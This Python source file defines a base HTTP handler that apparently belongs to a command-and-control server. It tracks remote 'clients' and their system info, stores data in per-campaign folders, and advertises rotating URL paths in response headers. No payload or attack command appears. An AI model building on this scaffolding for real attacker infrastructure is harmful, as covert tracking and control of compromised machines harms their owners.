import os
import logging
import json

logger = logging.getLogger(__name__)

class BaseHandler:
    """Base class for all endpoint handlers with common functionality"""
    
    def __init__(self, request_handler, client_manager, crypto_helper, client_helper, path_router):
        """
        Initialize the base handler
        
        Args:
            request_handler: The HTTP request handler instance
            client_manager: Client manager for tracking clients
            crypto_helper: Helper for encryption/decryption
            client_helper: Helper for client operations
            path_router: Path router for URL handling
        """
        self.request_handler = request_handler
        self.client_manager = client_manager
        self.crypto_helper = crypto_helper
        self.client_helper = client_helper
        self.path_router = path_router
        self.client_address = request_handler.client_address
        self.headers = request_handler.headers
        self.server = request_handler.server
        
    def log_message(self, message):
        """Log a message with client IP"""
        logger.info(f"{self.client_address[0]} - {message}")
    
    def send_response(self, status_code, content_type, content, headers=None):
        """
        Send HTTP response with standard headers
        
        Args:
            status_code: HTTP status code
            content_type: Content type for the response
            content: Response body content
            headers: Additional headers dict (optional)
        """
        self.request_handler.send_response(status_code)
        self.request_handler.send_header("Content-type", content_type)
        
        # Add rotation information to headers
        rotation_info = self.path_router.get_rotation_info()
        self.request_handler.send_header("X-Rotation-ID", str(rotation_info["current_rotation_id"]))
        self.request_handler.send_header("X-Next-Rotation", str(rotation_info["next_rotation_time"]))
        
        # Add any additional headers
        if headers:
            for key, value in headers.items():
                self.request_handler.send_header(key, value)
                
        self.request_handler.end_headers()
        
        # Send content
        if isinstance(content, str):
            content = content.encode("utf-8")
        self.request_handler.wfile.write(content)
    
    def send_success_response(self, additional_headers=None):
        """Send a standard success response"""
        headers = additional_headers or {}
        self.send_response(200, "text/plain", b"OK", headers)
    
    def send_error_response(self, status_code=500, message="Server Error"):
        """Send an error response"""
        self.send_response(status_code, "text/plain", message)
    
    def get_campaign_folder(self):
        """Get the current campaign folder path"""
        campaign_name = getattr(self.request_handler, 'campaign_name', None)
        
        if not campaign_name:
            # Try to find campaign directories
            campaign_dirs = [d for d in os.listdir() if d.endswith("_campaign") and os.path.isdir(d)]
            if campaign_dirs:
                campaign_name = campaign_dirs[0][:-9]  # Remove "_campaign" suffix
            else:
                campaign_name = "default"
        
        return f"{campaign_name}_campaign"
    
    def identify_client(self):
        """Identify client from headers or from IP address"""
        client_id = None
        client_identifier = self.headers.get('X-Client-ID')
        
        if client_identifier:
            # Try to find the client ID from the identifier
            for cid, client_info in self.client_manager.get_clients_info().items():
                if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
                    client_id = cid
                    break
        
        # If client wasn't identified by identifier, try by IP
        if not client_id:
            for cid, client_info in self.client_manager.get_clients_info().items():
                if client_info.get('ip') == self.client_address[0]:
                    client_id = cid
                    break
                    
        return client_id